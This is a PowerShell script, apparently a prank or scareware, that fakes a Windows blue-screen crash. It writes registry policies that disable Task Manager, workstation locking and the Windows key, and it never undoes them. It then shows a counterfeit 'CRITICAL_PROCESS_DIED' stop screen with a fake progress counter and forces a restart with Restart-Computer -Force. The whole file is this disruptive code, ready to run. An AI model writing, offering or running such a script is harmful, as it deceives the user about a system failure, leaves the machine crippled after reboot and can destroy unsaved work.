$wshell = New-Object -ComObject WScript.Shell
$wshell.SendKeys('^{ESC}')  
Start-Sleep -Seconds 1
$wshell.SendKeys('^{ESC}')  

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Screen {
    [DllImport("user32.dll")] public static extern int SetForegroundWindow(IntPtr hWnd);
    [DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
}
"@

$ps = (Get-Process -Id $pid).MainWindowHandle
[Screen]::ShowWindowAsync($ps, 3)  
[Screen]::SetForegroundWindow($ps)  

# Disable keyboard shortcuts (Alt+F4, Ctrl+Alt+Del, Win key)
$null = New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Force
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableLockWorkstation" -Value 1
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoWinKeys" -Value 1

Clear-Host
Write-Host "`n`n`n`n`n`n" -ForegroundColor Blue
Write-Host "  :(" -ForegroundColor Blue
Write-Host "  Your PC ran into a problem and needs to restart." -ForegroundColor Blue
Write-Host "  We're just collecting some error info, and then we'll restart for you." -ForegroundColor Blue
Write-Host "  If you'd like to know more, you can search online later for this error:" -ForegroundColor Blue
Write-Host "  CRITICAL_PROCESS_DIED" -ForegroundColor Blue

# Fake QR Code for realism
Write-Host "`n`n  For more information, visit:" -ForegroundColor Blue
Write-Host "  https://www.windows.com/stopcode" -ForegroundColor Blue

# Fake progress counter
Write-Host "`n  Collecting error info: 0% complete" -ForegroundColor Blue
Start-Sleep -Seconds 5
for ($i = 1; $i -le 100; $i++) {
    Clear-Host
    Write-Host "`n`n`n`n`n`n" -ForegroundColor Blue
    Write-Host "  :(" -ForegroundColor Blue
    Write-Host "  Your PC ran into a problem and needs to restart." -ForegroundColor Blue
    Write-Host "  We're just collecting some error info, and then we'll restart for you." -ForegroundColor Blue
    Write-Host "  If you'd like to know more, you can search online later for this error:" -ForegroundColor Blue
    Write-Host "  CRITICAL_PROCESS_DIED" -ForegroundColor Blue
    Write-Host "`n`n  For more information, visit:" -ForegroundColor Blue
    Write-Host "  https://www.windows.com/stopcode" -ForegroundColor Blue
    Write-Host "`n  Collecting error info: $i% complete" -ForegroundColor Blue
    Start-Sleep -Milliseconds 100
}

# Simulate restart (Optional)
Restart-Computer -Force
